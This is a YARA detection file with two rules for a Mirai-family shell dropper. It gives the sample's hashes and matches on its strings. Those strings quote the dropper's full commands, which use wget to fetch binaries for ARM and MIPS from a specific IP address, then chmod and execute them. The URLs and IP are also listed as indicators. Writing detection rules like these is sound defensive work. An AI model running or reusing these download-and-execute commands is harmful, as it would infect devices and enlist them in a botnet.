import "hash"

rule Single_Sample_Static_8985fe09d5b08240
{
  meta:
    source = "loop-engineering single-sample static analysis"
    analysis = "static only; sample not executed"
    sha256 = "8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9"
    md5 = "41b45aefd3f0a8e04abe7fd3a632ed94"
    sha1 = "d0eddc89079aeac09b7894ddfbf41275d7189848"
    file_magic = "63 64 20 2f 76 61 72 0a"
    malwarebazaar_family = "Mirai"
  strings:
    $s01 = "wget http://217.60.195.160/gigatex/arm; chmod 777 arm; ./arm gentech" nocase
    $s02 = "wget http://217.60.195.160/gigatex/arm5; chmod 777 arm5; ./arm5 gentech" nocase
    $s03 = "wget http://217.60.195.160/gigatex/arm7; chmod 777 arm7; ./arm7 gentech" nocase
    $s04 = "wget http://217.60.195.160/gigatex/mips; chmod 777 mips; ./mips gentech" nocase
    $s05 = "wget http://217.60.195.160/gigatex/mipsel; chmod 777 mipsel; ./mipsel gentech" nocase
  condition:
    hash.sha256(0, filesize) == "8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9" or 2 of ($s*)
}

rule Static_Source_Malware_Indicators
{
  meta:
    source = "loop-engineering static source analysis"
    language_hint = "shell"
    analysis = "static text only; sample not executed"
  strings:
    $url_01 = "http://217.60.195.160/gigatex/arm" nocase
    $url_02 = "http://217.60.195.160/gigatex/arm5" nocase
    $url_03 = "http://217.60.195.160/gigatex/arm7" nocase
    $url_04 = "http://217.60.195.160/gigatex/mips" nocase
    $url_05 = "http://217.60.195.160/gigatex/mipsel" nocase
    $ip_06 = "217.60.195.160" nocase
  condition:
    any of them
}
